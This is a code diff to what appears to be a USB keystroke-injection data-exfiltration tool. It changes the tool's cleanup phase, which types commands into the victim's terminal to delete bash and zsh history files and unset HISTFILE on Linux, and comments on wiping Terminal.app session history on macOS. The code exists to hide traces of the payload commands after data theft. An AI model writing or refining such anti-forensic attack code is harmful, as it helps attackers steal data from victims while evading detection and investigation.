@@ -495,11 +495,13 @@ static void phase_cleanup(HidExfilWorker* worker) {
         break;
 
     case TargetOSLinux:
-        /* Clear bash history and close */
+        /* Clear history for both bash and zsh — Ctrl+Alt+T opens the user's
+         * default shell which may be either.  `unset HISTFILE` prevents both
+         * shells from writing history on exit. */
         furi_delay_ms(300);
-        type_string("history -c && history -w\r\n", delay, worker);
+        type_string("rm -f ~/.bash_history ~/.zsh_history\r\n", delay, worker);
         furi_delay_ms(200);
-        type_string("rm -f ~/.bash_history\r\n", delay, worker);
+        type_string("unset HISTFILE\r\n", delay, worker);
         furi_delay_ms(200);
         type_string("exit\r\n", delay, worker);
         break;
@@ -511,7 +513,7 @@ static void phase_cleanup(HidExfilWorker* worker) {
          * the in-memory history (including payload commands) to a new
          * ~/.zsh_history on exit, defeating the cleanup.
          * Terminal.app also saves per-session history via a precmd hook
-         * in /etc/zshrc_Apple_Terminal to ~/.zsh_sessions/*.history.
+         * in /etc/zshrc_Apple_Terminal to ~/.zsh_sessions/ (*.history).
          * Removing $SHELL_SESSION_FILE and unsetting it prevents that. */
         furi_delay_ms(300);
         type_string("rm -f ~/.zsh_history ~/.bash_history\r\n", delay, worker);
